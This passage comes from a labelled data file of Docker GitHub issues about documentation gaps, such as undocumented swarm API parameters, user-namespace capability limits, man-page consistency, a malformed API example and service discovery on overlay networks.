either.\n"},{"labels":["documentation",null,null],"text":"The `/swarm/leave` api supports a `?force=true` parameter and it should be documented in the [api docs](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/leave-a-swarm). I'll be glad to send a PR for this.\n"},{"labels":["documentation",null,null,null],"text":"Currently, the Swarm Init api (/swarm/init) returns the node id when the swarm is successfully initialized:\n\n```\ncurl -XPOST --unix-socket /var/run/docker.sock http:/swarm/init -d '{\"ListenAddr\": \"127.0.0.1\"}'\n\"ejdf53mtjiqp8feyf1907si12\"\n```\n\nThis behavior is not documented in the [api docs](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/initialize-a-new-swarm).\n\nI believe this should be documented and I can send a PR for that.\n"},{"labels":["documentation",null,null],"text":"I am trying to run a program inside a docker container with user namespace support that requires some capabilities. Inside the container I am able to see that the capabilities were added but when I make calls that require these capabilities they fail.\n\nThe same calls work fine when I bypass user namespace with `--userns host` and add the required capabilities with `--cap-add`.\n\nSo far I have tested changing the scheduling policy and thread priority with a C program and `chrt`. This requires the `SYS_NICE` capability.\nI have also tested creating a message queue with larger sizes than allowed in `/proc/sys/fs/mqueue`. For the call to succeed the program would require the `SYS_RESOURCE` capability.\n\nWhen reading the documentation for user namespace support in dockerd it doesn't seem like this would not be a supported feature. In my opinion this would be a very useful feature that would increase security by enabling users to run semi-privileged programs in their own user namespace.\n\nIn any case, in the Docker engine reference for dockerd under \"User namespace known restrictions\", the following paragraphs should be modified to reflect these new restrictions:\n\n> Using --privileged mode flag on docker run (unless also specifying --userns=host)\n\nUsing `--privileged` mode or `--cap-add` for certain capabilities on docker run (unless also specifying --userns=host)\n\n> Finally, while the root user inside a user namespaced container process has many of the expected admin privileges that go along with being the superuser, the Linux kernel has restrictions based on internal knowledge that this is a user namespaced process. The most notable restriction that we are aware of at this time is the inability to use mknod. Permission will be denied for device creation even as container root inside a user namespace.\n\nThis paragraph could be extended to list all the functions that fail or capabilities that have no effect.\n\n---\n## BUG REPORT INFORMATION\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:11:10 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:11:10 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 6\n Running: 1\n Paused: 0\n Stopped: 5\nImages: 20\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/296608.296608/aufs\n Backing Filesystem: extfs\n Dirs: 25\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null overlay host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-34-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 2.768 GiB\nDocker Root Dir: /var/lib/docker/296608.296608\n\n```\n\ndockerd run command:\n`/usr/bin/dockerd --userns-remap=default -H fd://`\n\nI am running an Ubuntu VM on VMware Player on Windows 7\n\n**_For scheduling:**_\n**Steps to reproduce the issue:**\n1. `docker run -it --rm --cap-add SYS_NICE ubuntu bash`\n2. `chrt -f -p 99 1`\n\n**Describe the results you received:**\n`chrt: failed to set pid 1's policy: Operation not permitted`\n\n**Describe the results you expected:**\nI get the expected results using `--userns host`\n1. `docker run -it --rm --userns host --cap-add SYS_NICE ubuntu bash`\n2. `chrt -f -p 99 1`\n3. `chrt -p 1`\n`pid 1's current scheduling policy: SCHED_FIFO`\n`pid 1's current scheduling priority: 99`\n\n**_For the message queue:**_\nHere is a simple C program to test the message queue: https://gist.github.com/DeathTickle/aa8f980577d498850af4e819319636f9\n\nModify (or don't) the `QUEUE_SIZE` and `QUEUE_MSG_SIZE` defines to be greater than `/proc/sys/fs/mqueue/msg_max` and/or `/proc/sys/fs/mqueue/msgsize_max`\n\ncompile it with `gcc mq_open_test.c -o mq_open_test -lrt`\n\n**Steps to reproduce the issue:**\n1. `docker run -it --rm --cap-add SYS_RESOURCE -v $PWD/mq_open_test:/mq_open_test ubuntu bash`\n2. `./mq_open_test`\n\n**Describe the results you received:**\n`mq_open: Invalid argument`\n\n**Describe the results you expected:**\nI get the expected results using `--userns host`\n1. `docker run -it --rm --userns host --cap-add SYS_RESOURCE -v $PWD/mq_open_test:/mq_open_test ubuntu bash`\n2. `./mq_open_test`\n"},{"labels":["documentation"],"text":"Current man pages are not all consistent in term of content, placement and sections. There is also a lot of _duplication_ between man pages and cli reference documentation as they are maintained separately. This issues is there to discuss on those subjects and follow evolutions of our generation process.\n\nThe main goals are the following and take most of the inspiration from `git` man pages and reference documentation :\n- Have consistent man page across commands.\n- Have cli reference documentation be in sync (or the same) as man page (just a web page for it).\n- Have (or not) man pages generated from source (part of it or all of them).\n### Man page style guide\n\nWe currently don't have any style guide for man pages, i.e. what information to put where and in what order. As code style guide, we might want to define a _man page style guide_ document that would define what makes a good man page for `docker` commands. This is related to #16219.\n\nThat could look something like :\n\n```\n## NAME\n\ncommand - short description of the command\n\n## SYNOPSIS\n\ncommand --with --some --flags --and [OPTIONS] …\n\n##  DESCRIPTION\n\nA description is more detailed than what's in the NAME section, explaining more in depth what the command does (but that's all)\n\n## OPTIONS\n\n-a --all\n\nFlags descriptions …\n\n## ADDITIONAL SECTION 1\n\nAdditional section are possible. An example would be `FILTERING` and `FORMATTING` for the `docker-ps` command, or something about the reference format for command that allow us to set them (like `docker-commit`, `docker-tag`, …).\n\n## ADDITIONAL SECTION 2\n\nNo limit in the number of section though 👼\n\n## EXAMPLES\n\nHere, we just gives example on how to do this on that ; this is not where we explain how to filter container (it's done in its own section), just a working example of it.\n\n## ENVIRONMENT AND CONFIGURATION VARIABLES\n\nIf there is any environment variable or configuration (in the client/daemon config file) related to the command, we'll talk about it here ; like `ImagesFormat` for `docker-images` formatting.\n\n## SEE ALSO\n\n```\n### Man page and cli ref doc maintainability\n\nMaintaining separately man pages and cli reference documentation is error prone, it's easy to forget some flags or description somewhere. It's related to #19088. The basic idea would be to generate man pages and cli reference documentation from the same source.\n\nGiven that we are trying to generate man page from the code (at least partially), we should also study a way to generate cli reference documentation at the same time — shouldn't be difficult to convert markdown/man page to hmtl 👼.\n#23825 introduced a way to generate man page directly from code — from a small subset of command right now, but goal is to do that for all commands.\n\nCurrent limitations / questions are the following (making the assumption that cli reference documentation is generated from the same source) :\n- Cobra does not seems to allow add any custom section (it only supports `EXAMPLE`).  It's possible to add `## Some Section` in the description part, but this would make the `OPTIONS` section be really far down in the man pages (which can be fine :angel:).\n- It makes \"documentation\" PR's becomes more difficult; to make changes to this part of the documentation now requires contributors to touch the actual code.\n- Should we keep around some part of the man pages/documentation in markdown files (that would be merge with generated content from cobra) ?\n\n/cc @thaJeztah @dnephin @icecrime \n"},{"labels":[null,"documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 21:04:48 2016\n OS/Arch:      darwin/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 21:04:48 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\nand\n\n```\nClient:\n Version:      1.11.0\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   4dc5990\n Built:        Wed Apr 13 18:34:23 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.0\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   4dc5990\n Built:        Wed Apr 13 18:34:23 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 99\n Running: 2\n Paused: 0\n Stopped: 97\nImages: 52\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 250\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host overlay null\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.4.15-moby\nOperating System: Alpine Linux v3.4\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.954 GiB\nName: moby\nID: A7F5:MEE2:XJ2N:ZQ6Q:HRKO:SRQJ:CTJF:RR3B:6K7F:SQPP:NBJ7:I7MM\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): true\n File Descriptors: 26\n Goroutines: 41\n System Time: 2016-08-10T18:29:32.322513876Z\n EventsListeners: 1\nNo Proxy: *.local, 169.254/16\nUsername: flavin\nRegistry: https://index.docker.io/v1/\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\nand\n\n```\nContainers: 7\n Running: 0\n Paused: 0\n Stopped: 7\nImages: 1\nServer Version: 1.11.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 15\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null host\nKernel Version: 4.2.0-27-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 1.954 GiB\nName: xnat\nID: 3XVY:66LA:O7YA:ZRXD:5O3L:HR56:FBKD:5CG3:HAV3:JDG7:K3MX:44G7\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nthe first machine is my local Docker for Mac installation; the second is an Ubuntu 14.04 VM in VirtualBox.\n\n**Steps to reproduce the issue:**\n1. Use the remote API to GET events, using the `since` query param.. For example, here is a simple example that asks for all events since time 0. (I have verified this behavior with other, more realistic time values.)\n\n```\ncurl --unix-socket /var/run/docker.sock http://localhost/events?since=0\n```\n\n**Describe the results you received:**\nThe events in the specified time range (in the example, from time 0 until now) are sent to me from docker, and the HTTP stream remains open.\n\n**Describe the results you expected:**\nThe events in the specified time range (in the example, from time 0 until now) are sent to me from docker, and the stream is closed. This is the documented behavior when using the `since` or `until` query params.\n"},{"labels":["documentation",null],"text":"Release notes list macvlan as released with 1.12:\n\nhttps://github.com/docker/docker/releases/tag/v1.12.0\nhttps://github.com/docker/docker/pull/23524\n\nOnly docs are in experimental\n\nhttps://github.com/docker/docker/blob/master/experimental/vlan-networks.md#user-content-getting-started\n\nPer @programmerq :\nprogrammerq [9:58 AM]  \nIt could do with a one or two paragraph description of what the macvlan driver is, what technologies it uses, the fact that it is a local scope network driver, and why you might use it instead of another local scope driver (bridge)\n\ncc: @aboch \n"},{"labels":["documentation"],"text":"Is it intentional to have 1.12 `/swarm/leave` to have a query param of `?force=true`? If so, can we have the documentation updated (happy to do it if you point me in the right direction)? If not, should it be in the body instead and possibly JSON like the rest of the `/swarm/*` endpoints?\n\nThanks.\n"},{"labels":[null,"documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:00:36 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:00:36 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 53\n Running: 1\n Paused: 0\n Stopped: 52\nImages: 138\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 186\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor\nKernel Version: 3.19.0-33-generic\nOperating System: Ubuntu 14.04.5 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 15.67 GiB\nName: mafiosso-HSC\nID: 4IXB:YZFW:X4AW:LUMH:4K3Z:VB5V:DNAZ:DFPP:GCRY:EJJF:PB6F:HBVX\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. Post a large image via curl on /load\n\n**Describe the results you received:**\n Remote API returns code 500 with message {\"message\":\"http: POST too large\"}.\n\n**Describe the results you expected:**\nExpected behavior shloud be code 200\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation",null],"text":"In the section \"Adding a host without a driver\" of the document, \"Use Docker Machine to provision hosts on cloud providers\", https://docs.docker.com/machine/get-started-cloud/#adding-a-host-without-a-driver\n\nThere is an example:\n\n``` bash\n$ docker-machine create --url=tcp://50.134.234.20:2376 custombox\n$ docker-machine ls\nNAME        ACTIVE   DRIVER    STATE     URL\ncustombox   *        none      Running   tcp://50.134.234.20:2376\n```\n\nHowever, the command will fail under `docker-machine 0.8.0`, as there should be `-d none`, so the example should be:\n\n``` bash\n$ docker-machine create --driver none --url=tcp://50.134.234.20:2376 custombox\n$ docker-machine ls\nNAME        ACTIVE   DRIVER    STATE     URL\ncustombox   *        none      Running   tcp://50.134.234.20:2376\n```\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.25.md needs to be updated. @thaJeztah kindly agreed to take care of this.\n"},{"labels":["documentation",null],"text":"This is in reference to PIDs cgroup limit https://github.com/docker/docker/pull/18697 \n\nI am confused. Whats the default value for PIDs cgroup limit? below link says setting the value to -1 allows unlimited processes to be forked\nRef:  https://docs.docker.com/engine/reference/commandline/run/\n\nBut i was checking on my machine and the default value for it is \"0\" in which situation its allowing me to do unlimited forks. First two containers dont have any PIDs limit set and by default it was '0'.\n\nRef: docker ps --quiet | xargs docker inspect --format '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'\n\\60b19cf162aaa262765608f1533d0532c324f03a2f5e1701d5d98392da624802: PidsLimit=0\n6f8a8454a6f23d29163a22ee9533756d706382bbe3ba467f11f80f3e6489fd4b: PidsLimit=0\n8f2ecc51968d29010d6b6dc58bbfcf7fb4dc4ef52b465f04ff1a37e7ed7e734a: PidsLimit=512\n"},{"labels":["documentation",null],"text":"Tried to follow the Docker Remote API 1.24 docs, and found a broken example:\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-container\n\nThe example says:\n\n``` json\nPOST /containers/create HTTP/1.1\nContent-Type: application/json\n\n{\n       \"Hostname\": \"\",\n       \"Domainname\": \"\",\n       \"User\": \"\",\n       \"AttachStdin\": false,\n       \"AttachStdout\": true,\n       \"AttachStderr\": true,\n       \"Tty\": false,\n       \"OpenStdin\": false,\n       \"StdinOnce\": false,\n       \"Env\": [\n               \"FOO=bar\",\n               \"BAZ=quux\"\n       ],\n       \"Cmd\": [\n               \"date\"\n       ],\n       \"Entrypoint\": \"\",\n       \"Image\": \"ubuntu\",\n       \"Labels\": {\n               \"com.example.vendor\": \"Acme\",\n               \"com.example.license\": \"GPL\",\n               \"com.example.version\": \"1.0\"\n       },\n       \"Volumes\": {\n         \"/volumes/data\": {}\n       },\n       \"WorkingDir\": \"\",\n       \"NetworkDisabled\": false,\n       \"MacAddress\": \"12:34:56:78:9a:bc\",\n       \"ExposedPorts\": {\n               \"22/tcp\": {}\n       },\n       \"StopSignal\": \"SIGTERM\",\n       \"HostConfig\": {\n         \"Binds\": [\"/tmp:/tmp\"],\n         \"Links\": [\"redis3:redis\"],\n         \"Memory\": 0,\n         \"MemorySwap\": 0,\n         \"MemoryReservation\": 0,\n         \"KernelMemory\": 0,\n         \"CpuPercent\": 80,\n         \"CpuShares\": 512,\n         \"CpuPeriod\": 100000,\n         \"CpuQuota\": 50000,\n         \"CpusetCpus\": \"0,1\",\n         \"CpusetMems\": \"0,1\",\n         \"MaximumIOps\": 0,\n         \"MaximumIOBps\": 0,\n         \"BlkioWeight\": 300,\n         \"BlkioWeightDevice\": [{}],\n         \"BlkioDeviceReadBps\": [{}],\n         \"BlkioDeviceReadIOps\": [{}],\n         \"BlkioDeviceWriteBps\": [{}],\n         \"BlkioDeviceWriteIOps\": [{}],\n         \"MemorySwappiness\": 60,\n         \"OomKillDisable\": false,\n         \"OomScoreAdj\": 500,\n         \"PidMode\": \"\",\n         \"PidsLimit\": -1,\n         \"PortBindings\": { \"22/tcp\": [{ \"HostPort\": \"11022\" }] },\n         \"PublishAllPorts\": false,\n         \"Privileged\": false,\n         \"ReadonlyRootfs\": false,\n         \"Dns\": [\"8.8.8.8\"],\n         \"DnsOptions\": [\"\"],\n         \"DnsSearch\": [\"\"],\n         \"ExtraHosts\": null,\n         \"VolumesFrom\": [\"parent\", \"other:ro\"],\n         \"CapAdd\": [\"NET_ADMIN\"],\n         \"CapDrop\": [\"MKNOD\"],\n         \"GroupAdd\": [\"newgroup\"],\n         \"RestartPolicy\": { \"Name\": \"\", \"MaximumRetryCount\": 0 },\n         \"NetworkMode\": \"bridge\",\n         \"Devices\": [],\n         \"Ulimits\": [{}],\n         \"LogConfig\": { \"Type\": \"json-file\", \"Config\": {} },\n         \"SecurityOpt\": [],\n         \"StorageOpt\": {},\n         \"CgroupParent\": \"\",\n         \"VolumeDriver\": \"\",\n         \"ShmSize\": 67108864\n      },\n      \"NetworkingConfig\": {\n      \"EndpointsConfig\": {\n          \"isolated_nw\" : {\n              \"IPAMConfig\": {\n                  \"IPv4Address\":\"172.20.30.33\",\n                  \"IPv6Address\":\"2001:db8:abcd::3033\",\n                  \"LinkLocalIPs:[\"169.254.34.68\", \"fe80::3468\"]\n              },\n              \"Links\":[\"container_1\", \"container_2\"],\n              \"Aliases\":[\"server_x\", \"server_y\"]\n          }\n      }\n  }\n```\n\nThe most obvious typo is that `LinkLocalIPs` is missing closing quote, and as `NetworkingConfig` and `EndpointsConfig` are misaligned at the same indent, so the closing curly bracket are missing as well.\n"},{"labels":["documentation",null],"text":"Instead of adding users to the **_docker_** group as the [Installation manuals](https://docs.docker.com/engine/installation/#installation) suggest, which is a security hole by definition and antonomasia, I think it's better to add a password to the **_docker_** group and use the **sg** and **newgrp** commands as follows:\n\nAdd a password to **_docker_** group:\n`gpaswd docker`\n\nCreate a session with the **_docker_** group added to the supplementary group ID's:\n`sg docker newgrp $(id -gn)`\n\nAt this point the user may run **docker** commands...\n\nLogout:\n`exit`\n\nNote: The **sg** command is needed to avoid running the sequence: `newgrp docker` and then `exec newgrp $USER`\n\nOn the plus side, there's no need to use **sudo** anymore with its side-effects of resetting environment variables, etc.\n"},{"labels":[null,"documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Describe the results you received:**\n\nin [this twitter post](https://twitter.com/solomonstre/status/759342485483184128) @shykes mentions that docker image format now includes [HEALTHCHECK](https://docs.docker.com/engine/reference/builder/#healthcheck) information, so i expected the docker image spec to contain a reference to it, but when i looked it did not.\n\n**Describe the results you expected:**\n\ni expected to see supported docker image attributes to be specified and documented.\n"},{"labels":["documentation",null],"text":"documentation — fail, can't find reason, for PR #25203, are there anyone meeting this:\n\nBuild Errors:\nFix the path under windows for dockerimages.md: https://github.com/docker/docker/pull/25203\n# Filtered (engine) Summary:\n\n```\nFound: 852 files\nFound: 0 errors\n```\n"},{"labels":["documentation",null],"text":"The API docs do not cover DELETE or POST on `/nodes/<id>`. Only GET is documented.\n"},{"labels":["documentation"],"text":"see usage case here:\n\nhttps://github.com/docker/docker/issues/25004\n"},{"labels":["documentation"],"text":"Reference to `docker daemon` v/s `dockerd` is ambiguous in \"Configuring and running Docker on various distributions\" (docs/admin/index.md).  See @mlaventure 's comment on https://github.com/docker/docker/pull/24970/files/88ebfc701238dcfacfaf1d3f0a363848460df452#r71992335\n\nThis article looks like it needs to be reworked for clarity in general. \n"},{"labels":["documentation",null],"text":"The command line reference documentation for `docker service create` and `docker service updates` lists the supported flag, but does not explain each one in detail. When possible, we should add detailed descriptions of the flags.\n\ncc @sfsmithcha\n"},{"labels":["documentation"],"text":"Current docs/tutorial refer to listen address only. When https://github.com/docker/docker/pull/24237 goes in, need to clarify the distinction between listen address and advertise address and the address auto-detection behavior.\n"},{"labels":["documentation"],"text":"need to review docs for consistent usage of \"swarm\" and \"swarm mode\"\n\n\"swarm\" is not a proper noun. It should not be capitalized except when it comes at the beginning of the sentence.\n\nThe same is true of many of the concepts for \"swarm mode:\"\nworker node, manager node, etc.\n"},{"labels":["documentation",null],"text":"Verify whether or not the rolling update implements this before waiting the update dealy\n- Wait for the health checks on individual tasks to return a state of either `Running` or `Failed`. \n"},{"labels":["documentation"],"text":"per https://github.com/docker/docker/issues/23710#issuecomment-233751568, we don't have a CLI command (yet) to view logs for a service, so for 1.12 we should document this. Related issue for 1.13; https://github.com/docker/docker/issues/24812\n\n/cc @sfsmithcha should I assign this for you? Or keep it unassigned?\n"},{"labels":["documentation",null],"text":"The event documentation needs to be updated for the `health_status:` actions that are now being sent [here](https://github.com/docker/docker/blob/576c9fa2007cfb5f379f67b11cd852800f9175c6/daemon/health.go#L142). \n"},{"labels":["documentation",null,null],"text":""},{"labels":["documentation",null],"text":"cfr: https://github.com/docker/docker/issues/23931#issuecomment-233035772\n\nThis is supported now but the usage is not clear to users.  Hopefully my comment will help to explain or maybe I could submit a patch if I somehow miraculously find some time.\n"},{"labels":["documentation",null,null],"text":"The API uses an \"open schema\", which means that new properties _may_ be added to older API versions if a newer daemon is used. However, it should still be compatible with older clients.\n\nThis is described in the documentation; https://github.com/docker/docker/blob/v1.11.2/docs/reference/api/docker_remote_api.md\n\n> Docker's Remote API uses an open schema model. In this model, unknown properties in incoming messages are ignored. Client applications need to take this behavior into account to ensure they do not break when talking to newer Docker daemons.\n\nThis wording needs some improvement, because it doesn't clearly describe that older API versions can introduce \"unknown\" properties\n"},{"labels":["documentation",null,null],"text":"Does docker swarm mode supprt high availability?  could be multi-manager in one cluster?\n"},{"labels":["documentation",null,null],"text":"Swarm integration tests have a lot of helper functions and utilities that are really useful, but really poorly organized and documented. Most of the tests themselves are in `integration-cli/docker_api_swarm_test.go`, but the helpers are spread out across files like `integration-cli/docker_utils.go`. These helper functions need doc comments describing their usage, and there needs to be a short guide written on how to use the swarm integration helpers.\n\nFor example,\n\n```\nfunc waitAndAssert(c *check.C, timeout time.Duration, f checkF, checker check.Checker, args ...interface{})\n```\n\nhas no documentation explaining usage. \n\nFurther, there are things like:\n\n```\ntype checkF func(*check.C) (interface{}, check.CommentInterface)\ntype reducer func(...interface{}) interface{}\n```\n\nIt's totally unclear what a `checkF` or a `reducer` does or how to implement one.\n\nAdding this documentation would make writing new swarm integration tests way easier. Further than just adding documentation, a good refactoring of the testing suite might be in order, to improve clarity. Breaking the swarm suite into multiple smaller suites might also be good. Pretty much the whole integration suite is a mess and it needs work, but documentation and light-touch refactoring is a really great place to start on improving it.\n"},{"labels":["documentation",null],"text":"`docker run --pid=...` was implemented in https://github.com/docker/docker/pull/10080, but only the CLI docs were updated, but not the related API changes. Support for `--pid=container:...` was added in https://github.com/docker/docker/pull/22481, which also was not documented in the API\n"},{"labels":["documentation"],"text":"We temporarily changed those links, because for this release, the docs were published before GA was released; change the links back to their actual URL before GA; see https://github.com/docker/docker/pull/24471\n"},{"labels":["documentation",null],"text":"Sorry if this is a duplicate.  I feel like I'm asking a dumb question but I couldn't figure this out even with all the documentation and tutorials.  I think it would be great if the answer went into another page of [this tutorial](https://docs.docker.com/engine/swarm/swarm-tutorial/).\n\nIn docker 1.12.0-rc3 I set up 3 nodes in swarm mode and an overlay network.  \n\nI notice the task names are predictably networktest.1, .2, .3:\n\n```\n$ docker service tasks networktest\nID                         NAME           SERVICE      IMAGE   LAST STATE         DESIRED STATE  NODE\nd6naj58s8izkb822fpd4b6tl0  networktest.1  networktest  alpine  Running 4 seconds  Running        ip-172-31-47-32.us-west-2.compute.internal\n7sglm20hhbmn1ws5fiqvqfgx5  networktest.2  networktest  alpine  Running 4 seconds  Running        ip-172-31-43-158.us-west-2.compute.internal\nau4unlfyavw5y6vhodaw2dwe4  networktest.3  networktest  alpine  Running 4 seconds  Running        ip-172-31-43-158.us-west-2.compute.internal\n```\n\nbut the container names have a random suffix:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker ps\nCONTAINER ID        IMAGE                           COMMAND                  CREATED             STATUS              PORTS                                  NAMES\ne67110a596b0        alpine:latest                   \"sleep 36000\"            5 minutes ago       Up 5 minutes                                               networktest.1.d6naj58s8izkb822fpd4b6tl0\n```\n\nand\n\n```\n[ec2-user@ip-172-31-43-158 ~]$ docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n412ed90a1cd7        alpine:latest       \"sleep 36000\"       4 minutes ago       Up 3 minutes                            networktest.2.7sglm20hhbmn1ws5fiqvqfgx5\n44ea273ba889        alpine:latest       \"sleep 36000\"       4 minutes ago       Up 3 minutes                            networktest.3.au4unlfyavw5y6vhodaw2dwe4\n```\n\nHow are we then supposed to have container-to-container communication?\n\nSo giving that full randomly-generated name allows one container to ping another:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker exec -it e67110a596b0 ping networktest.2.7sglm20hhbmn1ws5fiqvqfgx5\nPING networktest.2.7sglm20hhbmn1ws5fiqvqfgx5 (10.0.0.4): 56 data bytes\n64 bytes from 10.0.0.4: seq=0 ttl=64 time=0.319 ms\n64 bytes from 10.0.0.4: seq=1 ttl=64 time=0.236 ms\n64 bytes from 10.0.0.4: seq=2 ttl=64 time=0.217 ms\n```\n\n_But_ I really wish this worked too:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker exec -it e67110a596b0 ping networktest.2\nping: bad address 'networktest.2'\n```\n\nI didn't see any parameters to `docker service create` for `links`, so how do I configure one container to communicate with another? \n\nIn [this blog](https://blog.docker.com/2016/06/docker-1-12-built-in-orchestration/) it implied the `frontend` and `redis` database would be connected with just the following commands. Was that misleading?\n\n```\ndocker network create -d overlay mynet\ndocker service create --name frontend --replicas 5 -p 80:80/tcp --network mynet mywebapp\ndocker service create --name redis --network mynet redis:latest\n```\n"},{"labels":["documentation",null],"text":"this is a raft cluster, so there needs to be a quorum of nodes available for the cluster to function\nif nodes have their address change at random, it will potentially disturb that quorum and be hard to recover from\nin production you would ​_never_​ deploy this in a way where managers aren't reachable at a fixed address (or DNS name). but maybe we can come up with a hack for laptop use that makes it more usable.\n"},{"labels":["documentation",null],"text":"The https://docs.docker.com/engine/swarm/key-concepts/ mentions  **\"By default manager nodes are also worker nodes, but you can configure managers to be manager-only nodes.\"**, I was not able to find how to configure the swarm managers to be manager-only nodes, maybe I missed something, but could someone shed some light on this? Thanks.\n"},{"labels":["documentation",null],"text":"The \"--privileged\" flag does a lot \"under the hood\"; apart from enabling all capabilities, it also disables apparmor profiles, seccomp profiles, etc.\n\nWe should document exactly what the flag does, so that people can make better decisions if they need it (or not)\n"},{"labels":["documentation",null],"text":"I have been unable to find any documentation or examples for the mount configuration option on the [docker service create](https://docs.docker.com/engine/reference/commandline/service_create/) command.  How do you express the source, target, driver and driver plugin specific options?\n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n(NOTE: attempted with both 'testing' and 'experimental' ubuntu 